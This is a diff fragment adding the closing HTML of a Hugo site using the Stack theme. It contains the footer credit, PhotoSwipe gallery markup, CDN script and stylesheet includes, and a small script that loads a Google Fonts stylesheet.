+        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.30.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.9a18bc510f28fc74544dcf12d90b1d46ba17f36f1ae169ef38bf0f9f3c140f15.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
